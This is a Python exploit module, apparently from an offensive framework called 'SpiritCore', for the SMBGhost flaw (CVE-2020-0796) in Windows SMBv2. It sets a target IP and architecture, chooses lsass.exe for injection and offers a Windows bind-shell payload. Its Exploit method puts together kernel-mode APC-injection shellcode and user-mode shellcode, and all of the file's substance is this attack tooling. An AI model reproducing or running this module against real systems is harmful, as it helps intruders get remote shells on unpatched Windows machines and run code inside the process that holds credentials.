from SpiritCore.Modules import *
from SpiritCore.Payload import *
from SpiritCore.System import *
from struct import pack
from impacket import smb
import sys,binascii,socket,datetime


































































class Module(Modules):
    Info={
        "Name":"SmbGh0st",
        "Author":"ZSD",
        "Description":"Microsoft Windows SMBv2 SMBGhost CVE-2020-0796 ",
        "Options":(
            ("TargetIp","192.168.1.107",True,'Target IP Address'),
            ("Architecture","x64",True,"Operating System, Service Pack, and Architecture of target OS"),
            ("Protocol","SMB",False,"Protocol for the backdoor to speak SMB and RDP"),
            ("ProcessName","lsass.exe",False,"Ring3 ShellCode Inject Target Process"),
            ),
        "Payload": ["windows/bind_shell_tcp", "Windows Ring3 ShellCode"],

    }
    def Exploit(self):
        print_msg("Generate ShellCode")
        SCO=ShellCode(self.Object,self.Object.UsePayloadObject.Name,self.Parameate)
        
        User_ShellCode = SCO.raw_shellcode()
        Kernel_ShellCode = SCO.Ring0ApcInjectRing3Shellcode(self.Parameate['ProcessName'],self.Parameate['Architecture'])
        #print(Kernel_ShellCode)
        return Kernel_ShellCode+User_ShellCode